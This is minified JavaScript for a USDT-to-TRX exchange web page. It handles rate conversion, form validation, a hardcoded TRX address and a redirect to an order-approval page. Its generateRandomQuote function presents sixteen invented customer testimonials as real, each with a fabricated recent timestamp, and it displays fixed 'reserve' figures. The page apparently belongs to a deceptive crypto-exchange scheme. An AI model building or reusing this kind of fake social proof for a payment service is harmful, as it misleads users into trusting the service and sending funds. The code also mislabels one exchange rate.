const usdtInput = document.getElementById("usdtAmount"),
    trxInput = document.getElementById("trx-amount"),
    minSum = 25,
    maxSum = 769524,
    anotherRate = 4.87,
    exchangeRate = 5.5031,
    trxTransactionAddress = "TSXA1nNei6LWe4yL7dV8srH1MgUsMog6W7",
    reverseRate = .18171576020788283,
    reserve = 4234767.5243999995;

function updateTRX() {
    let e = document.getElementById("usdtAmount"),
        t = document.getElementById("trx-amount"),
        n = parseFloat(e.value) || 0;
    t.value = (5.5031 * n).toFixed(6).replace(/(\.\d*?)0+$/, "$1").replace(/\.$/, "")
}

function updateUSDT() {
    let e = document.getElementById("trx-amount"),
        t = document.getElementById("usdtAmount"),
        n = parseFloat(e.value) || 0;
    t.value = (n / 5.5031).toFixed(6).replace(/(\.\d*?)0+$/, "$1").replace(/\.$/, "")
}

function generateRandomQuote() {
    let e = [{
            text: "Thank good site.",
            name: "Subhan"
        }, {
            text: "Good experience this app amazing services.",
            name: "Muazzam Ali"
        }, {
            text: "Very fast service.",
            name: "N1"
        }, {
            text: "I really liked it, the translation was done very quickly in less than 5 minutes, thank you very much, I will use your site.",
            name: "John Jones"
        }, {
            text: "Excellent and quick response.",
            name: "Emily Smith"
        }, {
            text: "Great service, very helpful!",
            name: "Ahmed Khan"
        }, {
            text: "Easy to use and fast.",
            name: "Ayesha"
        }, {
            text: "Very impressed with the speed and accuracy.",
            name: "Michael Brown"
        }, {
            text: "Nice experience, I will recommend it to my friends.",
            name: "Dmitry"
        }, {
            text: "The app was simple and efficient.",
            name: "Sarah Lee"
        }, {
            text: "Fantastic service, it helped me a lot!",
            name: "Carlos Santos"
        }, {
            text: "Quick and smooth experience.",
            name: "Anna Williams"
        }, {
            text: "Highly recommend this platform for translations.",
            name: "Ravi Patel"
        }, {
            text: "Good job, quick results.",
            name: "Zainab"
        }, {
            text: "Very user-friendly and fast!",
            name: "George Walker"
        }, {
            text: "The app is reliable and delivers fast results.",
            name: "Mariam"
        }],
        t = e[Math.floor(Math.random() * e.length)],
        n = generateRandomTime();
    return `"${t.text}" - ${t.name}, ${n}`
}

function generateRandomTime() {
    let e = new Date,
        t = new Date(e - Math.floor(54e7 * Math.random()));
    return formatTime(t)
}

function formatTime(e) {
    let t = e.getHours(),
        n = e.getMinutes(),
        a = e.getDate(),
        r = e.toLocaleString("en-GB", {
            month: "short"
        });
    return `${pad(t)}:${pad(n)} ${pad(a)} ${r}`
}

function pad(e) {
    return e < 10 ? `0${e}` : e
}

function toggleAnswer(e) {
    let t = document.getElementById(`answer-${e}`),
        n = document.querySelector(`#faq .faq-item:nth-child(${e}) .toggle-answer-btn`);
    "none" === t.style.display || "" === t.style.display ? (t.style.display = "block", n.textContent = "-") : (t.style.display = "none", n.textContent = "+")
}

function setBigTextBoxWidth() {
    let e = document.querySelector(".container").offsetWidth,
        t = document.querySelector(".big-text-box");
    t.style.width = `${e}px`
}

function highlightField(e) {
    e.type, e.style.boxShadow = "0 0 5px 1px red"
}
document.addEventListener("DOMContentLoaded", function() {
    function e() {
        document.querySelector(".min-sum"), document.querySelector(".max-sum")
    }
    document.querySelector(".min-sum").innerHTML = "Min. sum: 25 USDT", document.querySelector(".max-sum").innerHTML = `Max. sum: ${769524..toLocaleString()} USDT`, document.querySelector(".exchange-rate").innerHTML = "Exchange rate: 1 USDT = 5.5031 TRX", document.querySelector(".exchange-rate-reverse").innerHTML = `Exchange rate: 1 TRX = ${reverseRate.toFixed(4)} TRX`, document.querySelector(".reserve").innerHTML = `Reserve: ${reserve.toLocaleString()} TRX`, usdtInput.addEventListener("input", updateTRX), trxInput.addEventListener("input", updateUSDT), document.querySelectorAll(".Marquee-tag").forEach(e => {
        e.textContent = `${generateRandomQuote()}`
    }), usdtInput.addEventListener("blur", function() {
        25 > parseFloat(usdtInput.value) ? (usdtInput.value = 25, updateTRX()) : parseFloat(usdtInput.value) > 769524 && (usdtInput.value = 769524, updateTRX()), e()
    }), trxInput.addEventListener("blur", function() {
        let t = parseFloat(trxInput.value);
        t < 137.5775 ? trxInput.value = "137.5775".replace(/(\.\d*?)0+$/, "$1").replace(/\.$/, "") : t > 4234767.5243999995 && (trxInput.value = "4234768".replace(/(\.\d*?)0+$/, "$1").replace(/\.$/, "")), e()
    }), e()
}), window.addEventListener("resize", setBigTextBoxWidth), setBigTextBoxWidth(), document.addEventListener("DOMContentLoaded", function() {
    let e = document.getElementById("nav-menu"),
        t = document.getElementById("menu-toggle");
    e.classList.remove("active"), t.addEventListener("click", function() {
        e.classList.toggle("active")
    }), window.addEventListener("resize", function() {
        window.innerWidth > 1199 && e.classList.remove("active")
    })
});
const emailInput = document.getElementById("email"),
    trxAddressInput = document.getElementById("trx-address");

function startExchange() {
    let e = document.getElementById("usdtAmount"),
        t = document.getElementById("trx-amount");
    localStorage.setItem("usdtAmount", e.value), localStorage.setItem("trxAmount", t.value);
    let n = Math.floor(1e7 + 9e7 * Math.random());
    localStorage.setItem("randomNumber", n), window.location.href = `approval.html?order-approval-${n}`
}

function resetHighlights(e) {
    e.forEach(e => {
        e.style.border = ""
    })
}

function validateEmail(e) {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(e)
}

function validateTronWallet(e) {
    return "string" == typeof e && 34 === e.length && "T" === e.charAt(0)
}
emailInput.addEventListener("focus", () => highlightField(emailInput)), trxAddressInput.addEventListener("focus", () => highlightField(trxAddressInput)), emailInput.addEventListener("blur", () => emailInput.style.boxShadow = ""), trxAddressInput.addEventListener("blur", () => trxAddressInput.style.boxShadow = ""), document.addEventListener("DOMContentLoaded", function() {
    let e = localStorage.getItem("usdtAmount"),
        t = document.getElementById("result-usdt");
    e && (t.textContent = `USDT Amount: ${e}`)
}), document.getElementById("exchange-btn").addEventListener("click", function(e) {
    e.preventDefault(), validateForm() && startExchange()
});
const usdtAmountInput = document.getElementById("usdtAmount"),
    trxAmountInput = document.getElementById("trx-amount"),
    usdtFinalLabed = document.getElementById("result-usdt");

function validateForm() {
    let e = document.getElementById("usdtAmount"),
        t = document.getElementById("trx-amount"),
        n = document.getElementById("email"),
        a = document.getElementById("trx-address"),
        r = document.getElementById("accept-rules"),
        l = document.getElementById("accept-privacy-policy");
    resetHighlights([e, t, n, a, r, l]);
    let i = parseFloat(e.value) || 0,
        d = parseFloat(t.value) || 0;
    return isNaN(i) || i < 25 || i > 769524 ? (highlightField(e), !1) : isNaN(d) || d < 137.5775 || d > 4234767.5243999995 ? (highlightField(t), !1) : validateEmail(n.value) ? validateTronWallet(a.value) ? (r.checked || highlightField(r), l.checked || highlightField(l), !!r.checked && !!l.checked) : (console.log("shit"), highlightField(a), !1) : (highlightField(n), !1)
}
usdtAmountInput.addEventListener("input", function() {
    let e = parseFloat(usdtAmountInput.value);
    e >= 25 && e <= 769524 ? (usdtAmountInput.style.boxShadow = "", trxAmountInput.style.boxShadow = "") : (usdtAmountInput.style.boxShadow = "red 0px 0px 5px 1px", trxAmountInput.style.boxShadow = "red 0px 0px 5px 1px")
});